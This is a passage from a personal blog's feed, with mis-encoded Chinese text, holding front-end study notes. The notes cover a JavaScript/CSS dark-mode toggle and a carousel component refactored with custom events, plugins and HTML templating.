    <summary type="html">&lt;p&gt;å› ä¸ºæ¯æ¬¡ä½¿ç”¨ git æ“ä½œéƒ½éœ€è¦æœç´¢ä¸€ç•ªï¼Œå¥½å¤šæµç¨‹è®°ä¸ä½é¡ºåºï¼Œå°±æ‰“ç®—åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ä½¿ç”¨ git æ—¶çš„ä¸€äº›å¸¸ç”¨æ“ä½œä»¥åŠç»å¸¸é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆå§~&lt;/p&gt;
&lt;h2 id=&quot;æ‹‰å–é¡¹ç›®&quot;&gt;&lt;a href=&quot;#æ‹‰å–é¡¹ç›®&quot; class=&quot;headerlink&quot; title=&quot;æ‹‰å–é¡¹ç›®</summary>
      
    
    
    
    <category term="çŸ¥è¯†æ•´ç†" scheme="http://example.com/categories/%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    
    
    <category term="git" scheme="http://example.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>ã€å­¦ä¹ ç¬”è®°ã€‘â€” â€” å­—èŠ‚é’è®­è¥</title>
    <link href="http://example.com/2021/08/14/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/"/>
    <id>http://example.com/2021/08/14/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/</id>
    <published>2021-08-14T15:04:54.000Z</published>
    <updated>2021-10-07T03:42:06.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="Caseï¼šå†™ä¸€æ®µJSï¼Œæ§åˆ¶ç½‘é¡µå®ç°åˆ‡æ¢æ·±æµ…è‰²ä¸¤ç§æµè§ˆæ¨¡å¼"><a href="#Caseï¼šå†™ä¸€æ®µJSï¼Œæ§åˆ¶ç½‘é¡µå®ç°åˆ‡æ¢æ·±æµ…è‰²ä¸¤ç§æµè§ˆæ¨¡å¼" class="headerlink" title="Caseï¼šå†™ä¸€æ®µJSï¼Œæ§åˆ¶ç½‘é¡µå®ç°åˆ‡æ¢æ·±æµ…è‰²ä¸¤ç§æµè§ˆæ¨¡å¼"></a>Caseï¼šå†™ä¸€æ®µJSï¼Œæ§åˆ¶ç½‘é¡µå®ç°åˆ‡æ¢æ·±æµ…è‰²ä¸¤ç§æµè§ˆæ¨¡å¼</h2><h3 id="æ–¹æ³•ä¸€ã€JSæ”¹å˜DOMæ ·å¼"><a href="#æ–¹æ³•ä¸€ã€JSæ”¹å˜DOMæ ·å¼" class="headerlink" title="æ–¹æ³•ä¸€ã€JSæ”¹å˜DOMæ ·å¼"></a>æ–¹æ³•ä¸€ã€JSæ”¹å˜DOMæ ·å¼</h3><p><a href="https://code.h5jun.com/fapaz/edit?js,output">https://code.h5jun.com/fapaz/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;modeBtn&#x27;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> body = <span class="built_in">document</span>.body;</span><br><span class="line">  <span class="keyword">if</span>(body.className !== <span class="string">&#x27;night&#x27;</span>) &#123;</span><br><span class="line">    body.className = <span class="string">&#x27;night&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    body.className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒã€"><a href="#æ–¹æ³•äºŒã€" class="headerlink" title="æ–¹æ³•äºŒã€"></a>æ–¹æ³•äºŒã€</h3><p>æ³¨æ„åˆ°è¿™åªæ˜¯çº¯æ ·å¼çš„æ”¹å˜ï¼Œå› æ­¤è€ƒè™‘åªç”¨CSSã€‚<a href="https://code.h5jun.com/qofoz/edit?js,output">https://code.h5jun.com/qofoz/edit?js,output</a></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#modeCheckBox</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeCheckBox</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.content</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: black;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeBtn</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeBtn</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;ğŸŒ&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeCheckBox</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.content</span> <span class="selector-id">#modeBtn</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;ğŸŒœ&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><ul><li>HTML/CSS/JSå„å¸å…¶è´£ </li><li>åº”å½“é¿å…ä¸å¿…è¦çš„ç”±JSç›´æ¥æ“ä½œæ ·å¼</li><li>å¯ä»¥ç”¨ class æ¥è¡¨ç¤ºçŠ¶æ€</li><li>çº¯å±•ç¤ºç±»äº¤äº’å¯»æ±‚é›¶ JS æ–¹æ¡ˆ</li></ul><h2 id="Caseï¼šåŸç”ŸJSå®ç°è½®æ’­å›¾"><a href="#Caseï¼šåŸç”ŸJSå®ç°è½®æ’­å›¾" class="headerlink" title="Caseï¼šåŸç”ŸJSå®ç°è½®æ’­å›¾"></a>Caseï¼šåŸç”ŸJSå®ç°è½®æ’­å›¾</h2><p><strong>ç»„ä»¶</strong>ï¼šWeb é¡µé¢ä¸ŠæŠ½å‡ºæ¥ä¸€ä¸ªä¸ªåŒ…å«æ¨¡æ¿ï¼ˆHTMLï¼‰ã€åŠŸèƒ½ï¼ˆJSï¼‰å’Œæ ·å¼ï¼ˆCSSï¼‰çš„å•å…ƒã€‚å¥½çš„ç»„ä»¶å…·å¤‡å°è£…æ€§ã€æ­£ç¡®æ€§ã€æ‰©å±•æ€§ã€å¤ç”¨æ€§ã€‚</p><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>API è®¾è®¡åº”ä¿è¯åŸå­æ“ä½œï¼ŒèŒè´£å•ä¸€ï¼Œæ»¡è¶³çµæ´»æ€§ã€‚<a href="https://code.h5jun.com/tifuf/edit?js,output">https://code.h5jun.com/tifuf/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container</span><br><span class="line">    .querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container</span><br><span class="line">      .querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>)</span><br><span class="line">      % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.slideTo(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>ä½¿ç”¨è‡ªå®šä¹‰äº‹ä»¶æ¥è§£è€¦ã€‚<a href="https://code.h5jun.com/reba/3/edit?js,output">https://code.h5jun.com/reba/3/edit?js,output</a> ç¼ºç‚¹ï¼šå°è£…æ€§ä¸å¤ªå¥½ï¼Œconstructorè¿‡é•¿ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, cycle = <span class="number">3000</span></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = cycle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> controller = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">this</span>.slideTo(idx);</span><br><span class="line">          <span class="built_in">this</span>.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">this</span>.container.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">        <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å·¦ä¾§æŒ‰é’®</span></span><br><span class="line">    <span class="keyword">const</span> previous = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="built_in">this</span>.slidePrevious();</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å³ä¾§æŒ‰é’®</span></span><br><span class="line">    <span class="keyword">const</span> next = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(next)&#123;</span><br><span class="line">      next.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="built_in">this</span>.slideNext();</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">let</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">let</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰ï¼ˆä¼˜åŒ–ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆä¼˜åŒ–ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆä¼˜åŒ–ï¼‰"></a>æ–¹æ³•ä¸‰ï¼ˆä¼˜åŒ–ï¼‰</h3><p>å°†æ§åˆ¶å…ƒç´ æŠ½è±¡æˆæ’ä»¶ï¼Œæ’ä»¶ä¸ç»„ä»¶é—´é€šè¿‡<strong>ä¾èµ–æ³¨å…¥</strong>æ–¹å¼å»ºç«‹è”ç³»ã€‚<a href="https://code.h5jun.com/weru/3/edit?js,output">https://code.h5jun.com/weru/3/edit?js,output</a> </p><p>ä¼˜ç‚¹ï¼šå¯æå‡æ‰©å±•æ€§ã€‚</p><p>ç¼ºç‚¹ï¼šå½“æƒ³å–æ¶ˆå°åœ†ç‚¹æ—¶ï¼Œé™¤äº†æ³¨é‡Š js ä»£ç ï¼Œè¿˜éœ€ä¿®æ”¹ html ä¸­ä»£ç ã€‚(åªè§£è€¦äº† js éƒ¨åˆ†)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, cycle = <span class="number">3000</span></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = cycle;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> plugin(<span class="built_in">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ’ä»¶æ³¨å†Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginController</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">    <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">    controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">      <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        slider.slideTo(idx);</span><br><span class="line">        slider.stop();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">      slider.start();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">      <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">      buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å·¦æŒ‰é’®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginPrevious</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> previous = slider.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">    previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      slider.stop();</span><br><span class="line">      slider.slidePrevious();</span><br><span class="line">      slider.start();</span><br><span class="line">      evt.preventDefault();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å³æŒ‰é’®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginNext</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> next = slider.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(next)&#123;</span><br><span class="line">    next.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">      slider.stop();</span><br><span class="line">      slider.slideNext();</span><br><span class="line">      slider.start();</span><br><span class="line">      evt.preventDefault();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.registerPlugins(pluginController, pluginPrevious, pluginNext);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•å››"><a href="#æ–¹æ³•å››" class="headerlink" title="æ–¹æ³•å››"></a>æ–¹æ³•å››</h3><p>å°† HTML æ¨¡æ¿åŒ–ï¼Œæ›´æ˜“äºæ‹“å±•ã€‚<a href="https://code.h5jun.com/zuve/3/edit?js,output">https://code.h5jun.com/zuve/3/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, opts = &#123;images:[], cycle: <span class="number">3000</span>&#125;</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.options = opts;</span><br><span class="line">    <span class="built_in">this</span>.container.innerHTML = <span class="built_in">this</span>.render();</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = opts.cycle || <span class="number">3000</span>;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">render</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> images = <span class="built_in">this</span>.options.images;</span><br><span class="line">    <span class="keyword">const</span> content = images.map(<span class="function"><span class="params">image</span> =&gt;</span> <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;li class=&quot;slider-list__item&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;<span class="subst">$&#123;image&#125;</span>&quot;/&gt;</span></span><br><span class="line"><span class="string">      &lt;/li&gt;    </span></span><br><span class="line"><span class="string">    `</span>.trim());</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;ul&gt;<span class="subst">$&#123;content.join(<span class="string">&#x27;&#x27;</span>)&#125;</span>&lt;/ul&gt;`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span 